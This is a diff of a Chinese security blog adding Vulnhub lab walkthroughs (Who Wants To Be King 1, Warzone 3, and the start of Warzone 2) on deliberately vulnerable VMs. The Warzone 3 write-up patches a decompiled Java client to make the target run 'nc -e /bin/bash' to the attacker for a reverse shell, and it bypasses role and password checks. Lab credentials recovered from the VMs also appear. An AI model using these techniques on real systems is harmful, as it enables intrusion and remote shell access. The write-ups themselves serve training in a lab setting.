@@ -86,6 +86,406 @@
 
     
         <h2 class="title">
+            <a href="/2023/12/11/WhoWantsToBeKing-1/">
+                WHO WANTS TO BE KING 1
+            </a>
+        </h2>
+    
+    <time>
+        Dec 11, 2023
+    </time>
+    <section class="content">
+        <h1><span id="who-wants-to-be-king-1">WHO WANTS TO BE KING: 1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称who-wants-to-be-king-1">名称：Who Wants To Be King: 1</span></h4><h4><span id="发布日期2020121">发布日期：2020.12.1</span></h4><h4><span id="作者bjorn">作者：Bjorn</span></h4><h4><span id="系列who-wants-to-be-king">系列：Who Wants To Be King</span></h4><h4><span id="推特armbjorn">推特：@ArmBjorn</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;nice.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名whowantstobekingova">文件名：whowantstobeking.ova</span></h4><h4><span id="文件大小24gb">文件大小：2.4GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwhowantstobekingwhowantstobekingova">下载地址：</span></h4><h4><span id="md5-5b8bdcc5c24a3705c88f969b47a7199b">MD5: 5B8BDCC5C24A3705C88F969B47A7199B</span></h4><h4><span id="sha1-0114959a45db91f699594d1476ab900f610681ca">SHA1: 0114959A45DB91F699594D1476AB900F610681CA</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机whowantstobeking和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/2.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/3.png" alt="image"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现skeylogger文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.121 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/4.png" alt="image"></p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/5.png" alt="image"></p>
+<p>3.最后再进行一下目录扫描，没有什么发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.121 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="文件解密ssh登录">文件解密，SSH登录</span></h3><blockquote>
+<p>1.将skeylogger文件下载到本地，查看文件属性发现是二进制文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file skeylogger</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/7.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -all skeylogger</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/8.png" alt="image"></p>
+<p>2.再利用strings命令看看文件中有没有隐藏什么字符串，发现了一串base编码的字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings skeylogger</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/9.png" alt="image"></p>
+<p>3.将字符串解码，得到dracarys，这个到底是用户名还是密码我们不得而知，于是搜索一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ZHJhY2FyeXMK | base64 -d</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/10.png" alt="image"></p>
+<p>4.从网络查询我们可知，“Dracarys”来自奇幻作品《冰与火之歌》中高等瓦雷利亚语中的“龙焰”，是“龙之母”丹妮莉丝·坦格利安驾驭巨龙之火时使用的口号。靶机开放了22端口，所以很可能用户名是deanerys：</p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/11.png" alt="image"></p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/12.png" alt="image"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.SSH登录后，查看文件权限，有两个程序可以利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/13.png" alt="image"></p>
+<p>2.但在&#x2F;usr&#x2F;lib&#x2F;linuxmint&#x2F;mintUpdate目录下没有那两个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/lib/linuxmint/mintUpdate</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/14.png" alt="image"></p>
+<p>3.回到～目录下，发现在.local&#x2F;share目录下有一个daenerys.zip，解压出来的文件是djkdsnkjdsn，我们查看后提示我们note.txt的文件路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.local/share</span><br><span class="line">ls -la</span><br><span class="line"></span><br><span class="line">unzip daenerys.zip</span><br><span class="line">cat djkdsnkjdsn</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/15.png" alt="image"></p>
+<p>4.查看note.txt，得到提示，再次网络搜索，得到khaldrogo的全名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/sounds/note.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/16.png" alt="image"></p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/17.png" alt="image"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.khaldrogo就是root用户的密码，登录后在&#x2F;root目录下能够找到flag，即nice.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line"></span><br><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat nice.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/18.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WhoWantsToBeKing/" rel="tag">WhoWantsToBeKing</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/11/Warzone-3/">
+                WARZONE 3
+            </a>
+        </h2>
+    
+    <time>
+        Dec 11, 2023
+    </time>
+    <section class="content">
+        <h1><span id="warzone-3">WARZONE: 3</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称warzone-3">名称：Warzone: 3</span></h4><h4><span id="发布日期20201121">发布日期：2020.11.21</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列warzone">系列：Warzone</span></h4><h4><span id="推特-al1enum">推特: @AL1ENUM</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>anunnaki:&#x2F;~&#x2F;underboss.txt<br>root:&#x2F;root&#x2F;boss.txt </p>
+<h4><span id="难度困难">难度：困难</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名warzone3ova">文件名：Warzone3.ova</span></h4><h4><span id="文件大小25gb">文件大小：2.5GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwarzonewarzone3ova">下载地址：</span></h4><h4><span id="md5-3d82ab48e81bb31ee817eaecd8998747">MD5: 3D82AB48E81BB31EE817EAECD8998747</span></h4><h4><span id="sha1-8221a1683e3836903d050bf24e6e6601c72508b0">SHA1: 8221A1683E3836903D050BF24E6E6601C72508B0</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机warzone3和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2023/12/11/Warzone-3/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/2.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/3.png" alt="image"></p>
+<p>2.再进行端口扫描，发现开放了21，22和4444端口，都是无法网页访问的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.130 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="ftp匿名登录">FTP匿名登录</span></h3><blockquote>
+<p>1.来到21端口，我们发现ftp服务可匿名登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.130</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/5.png" alt="image"></p>
+<p>2.在&#x2F;pub目录下我们能发现note.txt及alienclient.jar，全部获取到kali查看一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd pub</span><br><span class="line">ls -la</span><br><span class="line">get note.txt</span><br><span class="line">get alienclient.jar</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/6.png" alt="image"></p>
+<p>3.在note.txt中有用户名alienum和密码exogenesis：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat note.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/7.png" alt="image"></p>
+<p>4.运行alienclient.jar，发现是一个登录器，输入用户密码登录并没有反应：</p>
+<p><img src="/2023/12/11/Warzone-3/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="alienclientjar反编修改">alienclient.jar反编修改</span></h3><blockquote>
+<p>1.我们将alienclient.jar反编译回.java的组成（<a target="_blank" rel="noopener" href="http://www.javadecompilers.com/%EF%BC%89%EF%BC%8C%E5%9C%A8Starter.java%E7%9A%84actionPerformed%E6%96%B9%E6%B3%95%E4%B8%AD%EF%BC%8C%E5%88%A4%E6%96%AD%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%97%B6%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%AD%98%E5%9C%A8%E6%9C%AC%E5%9C%B0%E9%89%B4%E6%9D%83%E9%97%AE%E9%A2%98%EF%BC%8C%E5%9C%A8%E5%88%A4%E6%96%AD%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E5%89%8D%E9%9C%80%E6%B7%BB%E5%8A%A0%E4%B8%80%E5%8F%A5role">http://www.javadecompilers.com/），在Starter.java的actionPerformed方法中，判断用户权限时，由于存在本地鉴权问题，在判断用户权限前需添加一句role</a> &#x3D; “astronaut”;来提升权限：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (e.getSource() == <span class="built_in">this</span>.viewButton)</span><br><span class="line">  role = <span class="string">&quot;astronaut&quot;</span>; <span class="comment">/*代码修改处*/</span></span><br><span class="line">  <span class="keyword">if</span> (Starter.role.equals(<span class="string">&quot;researcher&quot;</span>)) &#123;</span><br><span class="line">    JOptionPane.showMessageDialog(<span class="built_in">this</span>, <span class="string">&quot;Permission Denied&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (role.equals(<span class="string">&quot;astronaut&quot;</span>)) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>2.继续跟代码，发现reportList是执行代码list.setCmd(“tail -5 “ + f);，于是将它更改为list.setCmd(“nc -e &#x2F;bin&#x2F;bash 192.168.56.102 9002”);，并且将所有warzone.local改为靶机ip，重新编译成.jar，在kali开启对应端口监听，输入用户密码执行后，点击view：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(<span class="keyword">final</span> ActionEvent e)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      Starter.<span class="built_in">this</span>.socket = <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;warzone.local&quot;</span>, <span class="number">4444</span>);</span><br><span class="line">      Starter.<span class="built_in">this</span>.os = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Starter.<span class="built_in">this</span>.socket.getOutputStream());</span><br><span class="line">      <span class="keyword">final</span> <span class="type">RE</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RE</span>();</span><br><span class="line">      list.setToken(Starter.token);</span><br><span class="line">      list.setOption(<span class="string">&quot;VIEW&quot;</span>);</span><br><span class="line">      list.setValue(<span class="string">&quot;VALUE&quot;</span>);</span><br><span class="line">      list.setCmd(<span class="string">&quot;nc -e /bin/bash 192.168.56.102 9002&quot;</span>);  <span class="comment">/*代码修改处*/</span></span><br><span class="line">      Starter.<span class="built_in">this</span>.os.writeObject(list);</span><br><span class="line">      Starter.<span class="built_in">this</span>.is = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Starter.<span class="built_in">this</span>.socket.getInputStream());</span><br><span class="line">      <span class="keyword">final</span> <span class="type">RE</span> <span class="variable">response</span> <span class="operator">=</span> (RE)Starter.<span class="built_in">this</span>.is.readObject();</span><br><span class="line">      Starter.<span class="built_in">this</span>.os.close();</span><br><span class="line">      Starter.<span class="built_in">this</span>.socket.close();</span><br><span class="line">      Starter.<span class="built_in">this</span>.reportValue(response.getValue());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">nc -lvnp <span class="number">9002</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/9.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-3/10.png" alt="image"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.在exomorph用户目录下能够发现aliens.encrypted和wrz3encryptor.jar，都获取到kali：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">python3 -m http.server 8001，exomorph开放http服务</span><br><span class="line"></span><br><span class="line">wget http://192.168.56.130:8001/aliens.encrypted，kali获取</span><br><span class="line">wget http://192.168.56.130:8001/wrz3encryptor.jar</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/11.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-3/12.png" alt="image"></p>
+<p>2.再次对wrz3encryptor.jar进行反编，然后发现是AES的加密，可以写出解密方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decrypt</span><span class="params">(String key, File inputFile, File outputFile)</span> &#123;</span><br><span class="line">  doDeCrypto(<span class="number">2</span>, key, inputFile, outputFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doDeCrypto</span><span class="params">(<span class="type">int</span> cipherMode, String key, File inputFile, File outputFile)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Key</span> <span class="variable">secretKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key.getBytes(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    cipher.init(cipherMode, secretKey);</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(inputFile);</span><br><span class="line">    <span class="type">byte</span>[] inputBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>)inputFile.length()];</span><br><span class="line">    inputStream.read(inputBytes);</span><br><span class="line">    <span class="type">byte</span>[] outputBytes = cipher.doFinal(inputBytes);</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outputFile);</span><br><span class="line">    outputStream.write(outputBytes);</span><br><span class="line">    inputStream.close();</span><br><span class="line">    outputStream.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">      ex.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.对aliens.encrypted进行解密后，我们可以发现anunnaki用户及其密码：</p>
+<p><img src="/2023/12/11/Warzone-3/13.png" alt="image"></p>
+<p>4.可以通过ssh登录anunnaki用户，在用户目录下获得第一个flag，underboss.txt：</p>
+<p><img src="/2023/12/11/Warzone-3/14.png" alt="image"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.在&#x2F;home&#x2F;anunnaki目录下还可以发现secpasskeeper.jar.gpg文件，利用gpg解密：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg -o secpasskeeper.jar -d secpasskeeper.jar.gpg #passphrase为nak1nak1..</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/15.png" alt="image"></p>
+<p>2.解密后能得到secpasskeeper.jar文件，继续对其反编后，修改main方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">      System.out.println(<span class="string">&quot;[Warzone 3] Root&#x27;s Password Manager&quot;</span>);</span><br><span class="line">      System.out.print(<span class="string">&quot;Secret passphrase : &quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line">      <span class="type">Cryptor</span> <span class="variable">cryptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cryptor</span>();</span><br><span class="line">      <span class="type">Resources</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Resources</span>();</span><br><span class="line">      <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> cryptor.decrypt(secret, removeSalt(res.getCipher()));</span><br><span class="line">      <span class="type">String</span> <span class="variable">sys</span> <span class="operator">=</span> cryptor.decrypt(cryptor.decrypt(res.gotSecret(), removeSalt(res.getSecret())), removeSalt(res.getCipher()));</span><br><span class="line">      <span class="keyword">if</span> (<span class="literal">true</span><span class="comment">/*user.equals(sys)*/</span>) &#123; <span class="comment">/*代码修改处*/</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">plaintext</span> <span class="operator">=</span> cryptor.decrypt(cryptor.decrypt(res.gotSecret(), removeSalt(res.getSecret())), removeSalt(res.getCipher()));</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Success, the password is : &quot;</span> + plaintext);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[x] Failed&quot;</span>);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;[!] Terminated&quot;</span>);</span><br><span class="line">      System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.随意传递参数输入，可以得到root的密码为ufo_phosXEN，现在可以提权到root，并且在&#x2F;root目录下发现第二个flag，boss.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat boss.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-3/16.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/Warzone/" rel="tag">Warzone</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/11/Warzone-2/">
+                WARZONE 2
+            </a>
+        </h2>
+    
+    <time>
+        Dec 11, 2023
+    </time>
+    <section class="content">
+        <h1><span id="warzone-2">WARZONE: 2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称warzone-2">名称：Warzone: 2</span></h4><h4><span id="发布日期2020119">发布日期：2020.11.9</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列warzone">系列：Warzone</span></h4><h4><span id="推特-al1enum">推特: @AL1ENUM</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>admiral:&#x2F;~&#x2F;Desktop&#x2F;silver.txt<br>root:&#x2F;root&#x2F;Desktop&#x2F;gold.txt </p>
+<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名warzone2ova">文件名：Warzone2.ova</span></h4><h4><span id="文件大小26gb">文件大小：2.6GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwarzonewarzone2ova">下载地址：</span></h4><h4><span id="md5-ff639b25fb64a049e094fc20f51b732c">MD5: FF639B25FB64A049E094FC20F51B732C</span></h4><h4><span id="sha1-e5b5cadf476129cc365edf58c5855497b97f1aa5">SHA1: E5B5CADF476129CC365EDF58C5855497B97F1AA5</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机warzone2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2023/12/11/Warzone-2/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/2.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-2/3.png" alt="image"></p>
